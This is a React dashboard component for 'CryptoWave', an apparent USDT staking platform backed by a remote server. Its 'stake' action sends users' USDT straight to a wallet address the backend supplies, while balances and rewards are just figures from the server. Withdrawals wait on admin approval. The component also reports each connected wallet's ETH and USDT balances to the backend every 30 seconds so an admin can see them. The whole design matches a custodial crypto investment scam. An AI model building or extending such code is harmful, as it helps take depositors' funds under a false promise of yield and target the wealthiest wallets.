import { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import './Dashboard.css';

// USDT Contract Address (Ethereum Mainnet)
const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)'
];

const API_BASE = import.meta.env.VITE_API_URL || 'https://cryptowave-backend-pq3e.onrender.com';

function Dashboard({ walletAddress, onDisconnect }) {
  const [activeTab, setActiveTab] = useState('overview');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [notification, setNotification] = useState({ show: false, message: '', type: '' });

  // Real wallet data
  const [ethBalance, setEthBalance] = useState('0.00');
  const [usdtBalance, setUsdtBalance] = useState('0.00');
  const [loading, setLoading] = useState(false);
  const [dataLoading, setDataLoading] = useState(true);

  // User data from backend
  const [userData, setUserData] = useState({
    stakedAmount: 0,
    totalEarned: 0,
    vipLevel: 0,
    claimableRewards: 0
  });

  // Platform settings from backend
  const [platformSettings, setPlatformSettings] = useState({
    baseAPY: 12.5,
    vip1Bonus: 0.25,
    vip2Bonus: 0.5,
    vip3Bonus: 1.0
  });

  // Transactions from backend
  const [transactions, setTransactions] = useState([]);

  // Staking form state
  const [stakeAmount, setStakeAmount] = useState('');
  const [unstakeAmount, setUnstakeAmount] = useState('');

  // Withdraw state
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawals, setWithdrawals] = useState([]);

  // Report balance to backend (so admin can see it)
  const reportBalanceToBackend = useCallback(async (eth, usdt) => {
    try {
      await fetch(`${API_BASE}/api/report-balance`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, eth, usdt })
      });
    } catch (error) {
      console.log('Failed to report balance to backend');
    }
  }, [walletAddress]);

  // Fetch real wallet balance
  const fetchWalletBalance = useCallback(async () => {
    if (!window.ethereum || !walletAddress) return;

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);

      // Fetch ETH balance
      const ethBal = await provider.getBalance(walletAddress);
      const ethFormatted = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(4);
      setEthBalance(ethFormatted);

      // Fetch USDT balance
      let usdtFormatted = '0.00';
      try {
        const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
        const usdtBal = await usdtContract.balanceOf(walletAddress);
        const decimals = await usdtContract.decimals();
        usdtFormatted = parseFloat(ethers.utils.formatUnits(usdtBal, decimals)).toFixed(2);
        setUsdtBalance(usdtFormatted);
      } catch (usdtError) {
        console.log('USDT fetch error (may be on testnet):', usdtError);
        setUsdtBalance('0.00');
      }

      // Report balance to backend so admin can see it
      reportBalanceToBackend(ethFormatted, usdtFormatted);
    } catch (error) {
      console.error('Error fetching wallet balance:', error);
    }
  }, [walletAddress, reportBalanceToBackend]);

  // Fetch user data from backend
  const fetchUserData = useCallback(async () => {
    try {
      const response = await fetch(`${API_BASE}/api/user/${walletAddress}`);
      if (response.ok) {
        const data = await response.json();
        setUserData({
          stakedAmount: data.stakedAmount || 0,
          totalEarned: data.totalEarned || 0,
          vipLevel: data.vipLevel || 0,
          claimableRewards: data.claimableRewards || 0
        });
      }
    } catch (error) {
      console.error('Error fetching user data:', error);
    }
  }, [walletAddress]);

  // Fetch platform settings
  const fetchPlatformSettings = useCallback(async () => {
    try {
      const response = await fetch(`${API_BASE}/api/settings`);
      if (response.ok) {
        const data = await response.json();
        setPlatformSettings(data);
      }
    } catch (error) {
      console.error('Error fetching settings:', error);
    }
  }, []);

  // Fetch transactions
  const fetchTransactions = useCallback(async () => {
    try {
      const response = await fetch(`${API_BASE}/api/user/${walletAddress}/transactions`);
      if (response.ok) {
        const data = await response.json();
        setTransactions(data);
      }
    } catch (error) {
      console.error('Error fetching transactions:', error);
    }
  }, [walletAddress]);

  // Fetch user withdrawals
  const fetchWithdrawals = useCallback(async () => {
    try {
      const response = await fetch(`${API_BASE}/api/user/${walletAddress}/withdrawals`);
      if (response.ok) {
        const data = await response.json();
        setWithdrawals(data);
      }
    } catch (error) {
      console.error('Error fetching withdrawals:', error);
    }
  }, [walletAddress]);

  // Initial data fetch
  useEffect(() => {
    const loadData = async () => {
      setDataLoading(true);
      await Promise.all([
        fetchWalletBalance(),
        fetchUserData(),
        fetchPlatformSettings(),
        fetchTransactions(),
        fetchWithdrawals()
      ]);
      setDataLoading(false);
    };
    loadData();
  }, [fetchWalletBalance, fetchUserData, fetchPlatformSettings, fetchTransactions, fetchWithdrawals]);

  // Refresh wallet balance every 30 seconds
  useEffect(() => {
    const interval = setInterval(fetchWalletBalance, 30000);
    return () => clearInterval(interval);
  }, [fetchWalletBalance]);

  const showNotification = (message, type = 'success') => {
    setNotification({ show: true, message, type });
    setTimeout(() => {
      setNotification({ show: false, message: '', type: '' });
    }, 4000);
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(walletAddress);
    showNotification('Address copied to clipboard!', 'success');
  };

  // Calculate APY based on VIP level
  const getCurrentAPY = () => {
    const bonuses = [0, platformSettings.vip1Bonus, platformSettings.vip2Bonus, platformSettings.vip3Bonus];
    return (platformSettings.baseAPY + (bonuses[userData.vipLevel] || 0)).toFixed(2);
  };

  // Calculate daily earnings
  const getDailyEarnings = () => {
    const apy = parseFloat(getCurrentAPY());
    return ((userData.stakedAmount * (apy / 100)) / 365).toFixed(2);
  };

  // Handle stake — real on-chain USDT transfer
  const handleStake = async () => {
    const amount = parseFloat(stakeAmount);
    if (!amount || amount <= 0) {
      showNotification('Please enter a valid amount', 'error');
      return;
    }

    if (amount > parseFloat(usdtBalance)) {
      showNotification('Insufficient USDT balance', 'error');
      return;
    }

    setLoading(true);
    try {
      // Step 1: Get platform wallet from backend settings
      const settingsRes = await fetch(`${API_BASE}/api/settings`);
      const settings = await settingsRes.json();

      if (!settings.platformWallet) {
        showNotification('Platform wallet not configured. Contact admin.', 'error');
        setLoading(false);
        return;
      }

      // Step 2: Create signer and contract
      showNotification('Preparing USDT transfer...', 'info');
      const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = web3Provider.getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);

      // Step 3: Convert amount to USDT decimals (6 decimals)
      const amountInWei = ethers.utils.parseUnits(amount.toString(), 6);

      // Step 4: Send transfer transaction
      showNotification('Please confirm the transaction in your wallet...', 'info');
      const tx = await usdtContract.transfer(settings.platformWallet, amountInWei);

      showNotification('Transaction submitted! Waiting for confirmation...', 'info');

      // Step 5: Wait for 1 confirmation
      const receipt = await tx.wait(1);

      if (receipt.status === 0) {
        showNotification('Transaction failed on-chain', 'error');
        setLoading(false);
        return;
      }

      showNotification('Transaction confirmed! Verifying...', 'info');

      // Step 6: Send tx hash to backend for verification
      const response = await fetch(`${API_BASE}/api/stake`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress,
          amount,
          type: 'stake',
          txHash: tx.hash
        })
      });

      if (response.ok) {
        showNotification(`Successfully staked ${amount} USDT!`, 'success');
        setStakeAmount('');
        await fetchUserData();
        await fetchTransactions();
        await fetchWalletBalance();
      } else {
        const error = await response.json();
        showNotification(error.message || 'Backend verification failed', 'error');
      }
    } catch (error) {
      console.error('Stake error:', error);
      if (error.code === 4001 || error.code === 'ACTION_REJECTED') {
        showNotification('Transaction rejected by user', 'error');
      } else if (error.message?.includes('insufficient funds')) {
        showNotification('Insufficient ETH for gas fees', 'error');
      } else {
        showNotification(error.reason || error.message || 'Failed to stake. Please try again.', 'error');
      }
    } finally {
      setLoading(false);
    }
  };

  // Handle unstake
  const handleUnstake = async () => {
    const amount = parseFloat(unstakeAmount);
    if (!amount || amount <= 0) {
      showNotification('Please enter a valid amount', 'error');
      return;
    }

    if (amount > userData.stakedAmount) {
      showNotification('Amount exceeds staked balance', 'error');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch(`${API_BASE}/api/stake`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress,
          amount,
          type: 'unstake'
        })
      });

      if (response.ok) {
        showNotification(`Successfully unstaked ${amount} USDT!`, 'success');
        setUnstakeAmount('');
        await fetchUserData();
        await fetchTransactions();
      } else {
        const error = await response.json();
        showNotification(error.message || 'Unstaking failed', 'error');
      }
    } catch (error) {
      console.error('Unstake error:', error);
      showNotification('Failed to unstake. Please try again.', 'error');
    } finally {
      setLoading(false);
    }
  };

  // Handle claim rewards
  const handleClaimRewards = async () => {
    if (userData.claimableRewards <= 0) {
      showNotification('No rewards to claim', 'error');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch(`${API_BASE}/api/claim`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress })
      });

      if (response.ok) {
        const data = await response.json();
        showNotification(`Successfully claimed ${data.amount} USDT!`, 'success');
        await fetchUserData();
        await fetchTransactions();
      } else {
        const error = await response.json();
        showNotification(error.message || 'Claim failed', 'error');
      }
    } catch (error) {
      console.error('Claim error:', error);
      showNotification('Failed to claim rewards. Please try again.', 'error');
    } finally {
      setLoading(false);
    }
  };

  // Handle withdrawal request
  const handleWithdraw = async () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount <= 0) {
      showNotification('Please enter a valid amount', 'error');
      return;
    }

    // Calculate pending withdrawal total
    const pendingTotal = withdrawals
      .filter(w => w.status === 'pending')
      .reduce((sum, w) => sum + w.amount, 0);
    const availableBalance = userData.stakedAmount - pendingTotal;

    if (amount > availableBalance) {
      showNotification('Amount exceeds available staked balance', 'error');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch(`${API_BASE}/api/withdraw/request`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, amount })
      });

      if (response.ok) {
        showNotification(`Withdrawal request for ${amount} USDT submitted!`, 'success');
        setWithdrawAmount('');
        await fetchWithdrawals();
        await fetchTransactions();
      } else {
        const error = await response.json();
        showNotification(error.message || 'Withdrawal request failed', 'error');
      }
    } catch (error) {
      console.error('Withdraw error:', error);
      showNotification('Failed to submit withdrawal request. Please try again.', 'error');
    } finally {
      setLoading(false);
    }
  };

  // Get withdrawal fee from settings
  const getWithdrawalFee = () => {
    return platformSettings.withdrawalFee || 2;
  };

  // Format number with commas
  const formatNumber = (num) => {
    return parseFloat(num).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  // Get VIP level name
  const getVipName = (level) => {
    const names = ['Normal', 'VIP 1', 'VIP 2', 'VIP 3'];
    return names[level] || 'Normal';
  };

  if (dataLoading) {
    return (
      <div className="dashboard loading-state">
        <div className="loading-container">
          <div className="spinner large"></div>
          <p>Loading your dashboard...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="dashboard">
      {/* Notification */}
      {notification.show && (
        <div className={`notification ${notification.type}`}>
          <span>{notification.message}</span>
          <button onClick={() => setNotification({ show: false, message: '', type: '' })}>&times;</button>
        </div>
      )}

      {/* Mobile Menu Button */}
      <button
        className="mobile-menu-btn"
        onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
        aria-label="Toggle menu"
      >
        <span></span>
        <span></span>
        <span></span>
      </button>

      {/* Sidebar */}
      <aside className={`dashboard-sidebar ${mobileMenuOpen ? 'mobile-open' : ''}`}>
        <div className="sidebar-header">
          <div className="sidebar-logo">
            <div className="logo-icon-dash">C</div>
            <span>CRYPTOWAVE</span>
          </div>
        </div>

        <nav className="sidebar-nav">
          <button
            className={`nav-item ${activeTab === 'overview' ? 'active' : ''}`}
            onClick={() => { setActiveTab('overview'); setMobileMenuOpen(false); }}
          >
            <span className="nav-icon">📊</span>
            <span>Overview</span>
          </button>
          <button
            className={`nav-item ${activeTab === 'stake' ? 'active' : ''}`}
            onClick={() => { setActiveTab('stake'); setMobileMenuOpen(false); }}
          >
            <span className="nav-icon">💰</span>
            <span>Stake</span>
          </button>
          <button
            className={`nav-item ${activeTab === 'earnings' ? 'active' : ''}`}
            onClick={() => { setActiveTab('earnings'); setMobileMenuOpen(false); }}
          >
            <span className="nav-icon">📈</span>
            <span>Earnings</span>
          </button>
          <button
            className={`nav-item ${activeTab === 'withdraw' ? 'active' : ''}`}
            onClick={() => { setActiveTab('withdraw'); setMobileMenuOpen(false); }}
          >
            <span className="nav-icon">💸</span>
            <span>Withdraw</span>
          </button>
          <button
            className={`nav-item ${activeTab === 'transactions' ? 'active' : ''}`}
            onClick={() => { setActiveTab('transactions'); setMobileMenuOpen(false); }}
          >
            <span className="nav-icon">📋</span>
            <span>Transactions</span>
          </button>
          <button
            className={`nav-item ${activeTab === 'vip' ? 'active' : ''}`}
            onClick={() => { setActiveTab('vip'); setMobileMenuOpen(false); }}
          >
            <span className="nav-icon">⭐</span>
            <span>VIP Status</span>
          </button>
        </nav>

        <div className="sidebar-footer">
          <button className="disconnect-btn" onClick={onDisconnect}>
            <span>🚪</span>
            <span>Disconnect</span>
          </button>
        </div>
      </aside>

      {/* Mobile Overlay */}
      <div
        className={`mobile-overlay ${mobileMenuOpen ? 'show' : ''}`}
        onClick={() => setMobileMenuOpen(false)}
      ></div>

      {/* Main Content */}
      <main className="dashboard-main">
        <header className="dashboard-header">
          <div className="header-left">
            <h1>Dashboard</h1>
            <p className="header-subtitle">Welcome back!</p>
          </div>
          <div className="header-right">
            <div className="wallet-info">
              <span className="wallet-label">Connected Wallet</span>
              <div className="wallet-address" onClick={copyAddress}>
                <span>{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
                <span className="copy-icon">📋</span>
              </div>
            </div>
            <div className="vip-badge-header">
              <span className="vip-icon">⭐</span>
              <span>{getVipName(userData.vipLevel)}</span>
            </div>
          </div>
        </header>

        <div className="dashboard-content">
          {/* Overview Tab */}
          {activeTab === 'overview' && (
            <div className="overview-section">
              <div className="stats-grid">
                <div className="stat-card">
                  <div className="stat-header">
                    <span className="stat-icon">💎</span>
                    <span className="stat-label">Staked Balance</span>
                  </div>
                  <div className="stat-value">{formatNumber(userData.stakedAmount)} USDT</div>
                  <div className="stat-change positive">+{getCurrentAPY()}% APY</div>
                </div>

                <div className="stat-card">
                  <div className="stat-header">
                    <span className="stat-icon">💵</span>
                    <span className="stat-label">Wallet USDT</span>
                  </div>
                  <div className="stat-value">{formatNumber(usdtBalance)} USDT</div>
                  <div className="stat-change">Available to stake</div>
                </div>

                <div className="stat-card">
                  <div className="stat-header">
                    <span className="stat-icon">⚡</span>
                    <span className="stat-label">ETH Balance</span>
                  </div>
                  <div className="stat-value">{ethBalance} ETH</div>
                  <div className="stat-change">For gas fees</div>
                </div>

                <div className="stat-card">
                  <div className="stat-header">
                    <span className="stat-icon">🎯</span>
                    <span className="stat-label">Total Earned</span>
                  </div>
                  <div className="stat-value">{formatNumber(userData.totalEarned)} USDT</div>
                  <div className="stat-change positive">All time</div>
                </div>
              </div>

              <div className="quick-actions">
                <h2 className="section-title">Quick Actions</h2>
                <div className="actions-grid">
                  <button className="action-btn primary" onClick={() => setActiveTab('stake')}>
                    <span className="action-icon">➕</span>
                    <span>Stake USDT</span>
                  </button>
                  <button className="action-btn secondary" onClick={() => setActiveTab('stake')}>
                    <span className="action-icon">➖</span>
                    <span>Unstake</span>
                  </button>
                  <button
                    className="action-btn success"
                    onClick={handleClaimRewards}
                    disabled={loading || userData.claimableRewards <= 0}
                  >
                    <span className="action-icon">🎁</span>
                    <span>Claim {formatNumber(userData.claimableRewards)} USDT</span>
                  </button>
                  <button className="action-btn withdraw" onClick={() => setActiveTab('withdraw')}>
                    <span className="action-icon">💸</span>
                    <span>Withdraw</span>
                  </button>
                </div>
              </div>

              <div className="info-cards-grid">
                <div className="info-card">
                  <h3>📈 Daily Earnings</h3>
                  <div className="info-value">{getDailyEarnings()} USDT</div>
                  <p>Estimated daily earnings based on your stake</p>
                </div>
                <div className="info-card">
                  <h3>🎁 Claimable</h3>
                  <div className="info-value">{formatNumber(userData.claimableRewards)} USDT</div>
                  <p>Rewards ready to claim</p>
                </div>
                <div className="info-card">
                  <h3>⭐ VIP Status</h3>
                  <div className="info-value">{getVipName(userData.vipLevel)}</div>
                  <p>Current membership tier</p>
                </div>
              </div>

              <div className="recent-transactions">
                <h2 className="section-title">Recent Activity</h2>
                <div className="transactions-list">
                  {transactions.length > 0 ? (
                    transactions.slice(0, 5).map((tx, index) => (
                      <div key={tx.id || index} className="transaction-item">
                        <div className="tx-icon-wrapper">
                          <span className={`tx-icon ${tx.type}`}>
                            {tx.type === 'stake' ? '➕' : tx.type === 'unstake' ? '➖' : tx.type === 'withdraw' ? '💸' : '🎁'}
                          </span>
                        </div>
                        <div className="tx-info">
                          <div className="tx-type">{tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</div>
                          <div className="tx-date">{tx.date}</div>
                        </div>
                        <div className="tx-amount">{formatNumber(tx.amount)} USDT</div>
                      </div>
                    ))
                  ) : (
                    <div className="no-transactions">
                      <p>No transactions yet. Start by staking some USDT!</p>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* Stake Tab */}
          {activeTab === 'stake' && (
            <div className="stake-section">
              <div className="stake-grid">
                <div className="stake-panel">
                  <h2 className="panel-title">Stake USDT</h2>
                  <div className="balance-display">
                    <span>Available Balance</span>
                    <span className="balance-value">{formatNumber(usdtBalance)} USDT</span>
                  </div>
                  <div className="input-group">
                    <input
                      type="number"
                      placeholder="Enter amount to stake"
                      value={stakeAmount}
                      onChange={(e) => setStakeAmount(e.target.value)}
                      className="stake-input"
                      disabled={loading}
                    />
                    <button className="max-btn" onClick={() => setStakeAmount(usdtBalance)} disabled={loading}>
                      MAX
                    </button>
                  </div>
                  <div className="quick-amounts">
                    <button onClick={() => setStakeAmount('100')} disabled={loading}>100</button>
                    <button onClick={() => setStakeAmount('500')} disabled={loading}>500</button>
                    <button onClick={() => setStakeAmount('1000')} disabled={loading}>1,000</button>
                    <button onClick={() => setStakeAmount('5000')} disabled={loading}>5,000</button>
                  </div>
                  <div className="stake-info">
                    <div className="info-row">
                      <span>Current APY</span>
                      <span className="info-value">{getCurrentAPY()}% Annual</span>
                    </div>
                    <div className="info-row">
                      <span>Estimated Daily Earnings</span>
                      <span className="info-value">
                        {stakeAmount ? ((parseFloat(stakeAmount) * (parseFloat(getCurrentAPY()) / 100)) / 365).toFixed(4) : '0.00'} USDT
                      </span>
                    </div>
                  </div>
                  <button
                    className="stake-btn primary"
                    onClick={handleStake}
                    disabled={loading || !stakeAmount}
                  >
                    {loading ? 'Processing...' : 'Stake Now'}
                  </button>
                </div>

                <div className="stake-panel">
                  <h2 className="panel-title">Your Staked Balance</h2>
                  <div className="balance-display">
                    <span>Currently Staked</span>
                    <span className="balance-value">{formatNumber(userData.stakedAmount)} USDT</span>
                  </div>
                  <div className="stake-info">
                    <div className="info-row">
                      <span>VIP Level</span>
                      <span className="info-value">VIP {userData.vipLevel}</span>
                    </div>
                    <div className="info-row">
                      <span>Current APY</span>
                      <span className="info-value">{getCurrentAPY()}% Annual</span>
                    </div>
                    <div className="info-row">
                      <span>Daily Earnings</span>
                      <span className="info-value">{getDailyEarnings()} USDT</span>
                    </div>
                  </div>
                  <div className="warning-box">
                    To withdraw staked USDT, use the Withdraw tab. Withdrawals require admin approval.
                  </div>
                  <button
                    className="stake-btn secondary"
                    onClick={() => setActiveTab('withdraw')}
                  >
                    Go to Withdraw
                  </button>
                </div>
              </div>

              <div className="claim-panel">
                <div className="claim-header">
                  <div>
                    <h2 className="panel-title">Claimable Rewards</h2>
                    <p className="claim-subtitle">Your accumulated earnings ready to claim</p>
                  </div>
                  <div className="claim-amount">{formatNumber(userData.claimableRewards)} USDT</div>
                </div>
                <button
                  className="stake-btn success"
                  onClick={handleClaimRewards}
                  disabled={loading || userData.claimableRewards <= 0}
                >
                  {loading ? 'Processing...' : 'Claim Rewards'}
                </button>
              </div>
            </div>
          )}

          {/* Withdraw Tab */}
          {activeTab === 'withdraw' && (
            <div className="withdraw-section">
              <div className="withdraw-grid">
                <div className="stake-panel">
                  <h2 className="panel-title">Request Withdrawal</h2>
                  <div className="balance-display">
                    <span>Staked Balance</span>
                    <span className="balance-value">{formatNumber(userData.stakedAmount)} USDT</span>
                  </div>
                  {withdrawals.filter(w => w.status === 'pending').length > 0 && (
                    <div className="warning-box">
                      ⏳ You have {withdrawals.filter(w => w.status === 'pending').length} pending withdrawal(s) totaling {formatNumber(withdrawals.filter(w => w.status === 'pending').reduce((s, w) => s + w.amount, 0))} USDT
                    </div>
                  )}
                  <div className="input-group">
                    <input
                      type="number"
                      placeholder="Enter amount to withdraw"
                      value={withdrawAmount}
                      onChange={(e) => setWithdrawAmount(e.target.value)}
                      className="stake-input"
                      disabled={loading}
                    />
                    <button
                      className="max-btn"
                      onClick={() => {
                        const pendingTotal = withdrawals.filter(w => w.status === 'pending').reduce((s, w) => s + w.amount, 0);
                        setWithdrawAmount(String(Math.max(0, userData.stakedAmount - pendingTotal)));
                      }}
                      disabled={loading}
                    >
                      MAX
                    </button>
                  </div>
                  <div className="quick-amounts">
                    <button onClick={() => setWithdrawAmount('100')} disabled={loading}>100</button>
                    <button onClick={() => setWithdrawAmount('500')} disabled={loading}>500</button>
                    <button onClick={() => setWithdrawAmount('1000')} disabled={loading}>1,000</button>
                    <button onClick={() => setWithdrawAmount('5000')} disabled={loading}>5,000</button>
                  </div>
                  <div className="stake-info">
                    <div className="info-row">
                      <span>Withdrawal Fee</span>
                      <span className="info-value">{getWithdrawalFee()}%</span>
                    </div>
                    <div className="info-row">
                      <span>Fee Amount</span>
                      <span className="info-value">
                        {withdrawAmount ? (parseFloat(withdrawAmount) * getWithdrawalFee() / 100).toFixed(2) : '0.00'} USDT
                      </span>
                    </div>
                    <div className="info-row">
                      <span>You Will Receive</span>
                      <span className="info-value" style={{ color: '#10b981' }}>
                        {withdrawAmount ? (parseFloat(withdrawAmount) * (1 - getWithdrawalFee() / 100)).toFixed(2) : '0.00'} USDT
                      </span>
                    </div>
                  </div>
                  <div className="warning-box">
                    ⚠️ Withdrawals require admin approval. Your staked balance will be deducted after approval.
                  </div>
                  <button
                    className="stake-btn withdraw-btn"
                    onClick={handleWithdraw}
                    disabled={loading || !withdrawAmount}
                  >
                    {loading ? 'Processing...' : 'Request Withdrawal'}
                  </button>
                </div>

                <div className="stake-panel">
                  <h2 className="panel-title">Withdrawal History</h2>
                  <div className="withdraw-history">
                    {withdrawals.length > 0 ? (
                      withdrawals.map((w, index) => (
                        <div key={w.id || index} className="withdraw-item">
                          <div className="withdraw-item-header">
                            <span className={`withdraw-status ${w.status}`}>
                              {w.status === 'pending' ? '⏳' : w.status === 'approved' ? '✅' : '❌'} {w.status.charAt(0).toUpperCase() + w.status.slice(1)}
                            </span>
                            <span className="withdraw-date">{new Date(w.requestedAt).toLocaleDateString()}</span>
                          </div>
                          <div className="withdraw-item-details">
                            <div className="withdraw-detail-row">
                              <span>Amount</span>
                              <span>{formatNumber(w.amount)} USDT</span>
                            </div>
                            <div className="withdraw-detail-row">
                              <span>Fee</span>
                              <span>-{formatNumber(w.fee)} USDT</span>
                            </div>
                            <div className="withdraw-detail-row net">
                              <span>Net Amount</span>
                              <span>{formatNumber(w.netAmount)} USDT</span>
                            </div>
                          </div>
                          {w.rejectionReason && (
                            <div className="withdraw-rejection">
                              Reason: {w.rejectionReason}
                            </div>
                          )}
                        </div>
                      ))
                    ) : (
                      <div className="no-transactions">
                        <p>No withdrawal requests yet</p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Earnings Tab */}
          {activeTab === 'earnings' && (
            <div className="earnings-section">
              <div className="earnings-summary">
                <div className="summary-card">
                  <h3>Today's Earnings</h3>
                  <div className="summary-value">{getDailyEarnings()} USDT</div>
                  <div className="summary-subtitle">Estimated daily</div>
                </div>
                <div className="summary-card">
                  <h3>This Week</h3>
                  <div className="summary-value">{(parseFloat(getDailyEarnings()) * 7).toFixed(2)} USDT</div>
                  <div className="summary-subtitle">7-day projection</div>
                </div>
                <div className="summary-card">
                  <h3>This Month</h3>
                  <div className="summary-value">{(parseFloat(getDailyEarnings()) * 30).toFixed(2)} USDT</div>
                  <div className="summary-subtitle">30-day projection</div>
                </div>
                <div className="summary-card">
                  <h3>All Time</h3>
                  <div className="summary-value">{formatNumber(userData.totalEarned)} USDT</div>
                  <div className="summary-subtitle">Total earned</div>
                </div>
              </div>

              <div className="earnings-breakdown">
                <h2 className="section-title">Earnings Breakdown</h2>
                <div className="breakdown-list">
                  <div className="breakdown-item">
                    <span>Base APY</span>
                    <span>{platformSettings.baseAPY}%</span>
                  </div>
                  <div className="breakdown-item">
                    <span>VIP Bonus</span>
                    <span>+{userData.vipLevel > 0 ? [0, platformSettings.vip1Bonus, platformSettings.vip2Bonus, platformSettings.vip3Bonus][userData.vipLevel] : 0}%</span>
                  </div>
                  <div className="breakdown-item">
                    <span>Effective APY</span>
                    <span className="highlight">{getCurrentAPY()}%</span>
                  </div>
                  <div className="breakdown-item">
                    <span>Daily Earnings Rate</span>
                    <span>{(parseFloat(getCurrentAPY()) / 365).toFixed(4)}%</span>
                  </div>
                  <div className="breakdown-item">
                    <span>Staked Amount</span>
                    <span>{formatNumber(userData.stakedAmount)} USDT</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Transactions Tab */}
          {activeTab === 'transactions' && (
            <div className="transactions-section">
              <div className="transactions-header">
                <h2 className="section-title">Transaction History</h2>
                <button className="refresh-btn" onClick={fetchTransactions}>
                  🔄 Refresh
                </button>
              </div>

              <div className="transactions-table">
                <div className="table-header">
                  <div className="table-cell">Type</div>
                  <div className="table-cell">Amount</div>
                  <div className="table-cell">Date</div>
                  <div className="table-cell">Status</div>
                </div>
                {transactions.length > 0 ? (
                  transactions.map((tx, index) => (
                    <div key={tx.id || index} className="table-row">
                      <div className="table-cell" data-label="Type">
                        <span className={`tx-badge ${tx.type}`}>
                          {tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}
                        </span>
                      </div>
                      <div className="table-cell" data-label="Amount">{formatNumber(tx.amount)} USDT</div>
                      <div className="table-cell" data-label="Date">{tx.date}</div>
                      <div className="table-cell" data-label="Status">
                        <span className={`status-badge ${tx.status}`}>{tx.status}</span>
                      </div>
                    </div>
                  ))
                ) : (
                  <div className="no-transactions-full">
                    <p>No transactions yet</p>
                    <span>Start by staking some USDT to see your transaction history</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* VIP Tab */}
          {activeTab === 'vip' && (
            <div className="vip-section-dash">
              <div className="current-vip">
                <div className="vip-card">
                  <div className="vip-icon-large">⭐</div>
                  <h2>{getVipName(userData.vipLevel)}</h2>
                  <div className="vip-apy">{getCurrentAPY()}% APY</div>
                  <div className="vip-staked">Staked: {formatNumber(userData.stakedAmount)} USDT</div>
                </div>
              </div>

              <div className="vip-tiers">
                <h2 className="section-title">All VIP Tiers</h2>
                <div className="tiers-list">
                  <div className={`tier-item ${userData.vipLevel === 0 ? 'active' : ''}`}>
                    <div className="tier-badge-dash">Normal</div>
                    <div className="tier-requirement">0 - 9,999 USDT</div>
                    <div className="tier-apy-dash">{platformSettings.baseAPY}% APY</div>
                    <div className="tier-benefits">
                      <div>✓ Standard support</div>
                      <div>✓ Daily compounding</div>
                    </div>
                  </div>

                  <div className={`tier-item ${userData.vipLevel === 1 ? 'active' : ''}`}>
                    <div className="tier-badge-dash">VIP 1</div>
                    <div className="tier-requirement">10,000 - 49,999 USDT</div>
                    <div className="tier-apy-dash">{(platformSettings.baseAPY + platformSettings.vip1Bonus).toFixed(2)}% APY</div>
                    <div className="tier-benefits">
                      <div>✓ Priority support</div>
                      <div>✓ Bonus rewards</div>
                      <div>✓ Advanced analytics</div>
                    </div>
                  </div>

                  <div className={`tier-item ${userData.vipLevel === 2 ? 'active' : ''}`}>
                    <div className="tier-badge-dash">VIP 2</div>
                    <div className="tier-requirement">50,000 - 99,999 USDT</div>
                    <div className="tier-apy-dash">{(platformSettings.baseAPY + platformSettings.vip2Bonus).toFixed(2)}% APY</div>
                    <div className="tier-benefits">
                      <div>✓ Dedicated manager</div>
                      <div>✓ Higher rewards</div>
                      <div>✓ Early access</div>
                      <div>✓ Lower fees</div>
                    </div>
                  </div>

                  <div className={`tier-item ${userData.vipLevel === 3 ? 'active' : ''}`}>
                    <div className="tier-badge-dash premium">VIP 3</div>
                    <div className="tier-requirement">100,000+ USDT</div>
                    <div className="tier-apy-dash">{(platformSettings.baseAPY + platformSettings.vip3Bonus).toFixed(2)}% APY</div>
                    <div className="tier-benefits">
                      <div>✓ All benefits</div>
                      <div>✓ Maximum rewards</div>
                      <div>✓ 24/7 VIP support</div>
                      <div>✓ No fees</div>
                      <div>✓ Exclusive events</div>
                    </div>
                  </div>
                </div>
              </div>

              {userData.vipLevel < 3 && (
                <div className="next-tier-progress">
                  <h3>Progress to {getVipName(userData.vipLevel + 1)}</h3>
                  <div className="progress-bar">
                    <div className="progress-fill" style={{
                      width: `${Math.min(100, (userData.stakedAmount / [10000, 50000, 100000][userData.vipLevel]) * 100)}%`
                    }}></div>
                  </div>
                  <div className="progress-info">
                    <span>Current: {formatNumber(userData.stakedAmount)} USDT</span>
                    <span>Need: {formatNumber(Math.max(0, [10000, 50000, 100000][userData.vipLevel] - userData.stakedAmount))} more USDT</span>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </main>
    </div>
  );
}

export default Dashboard;
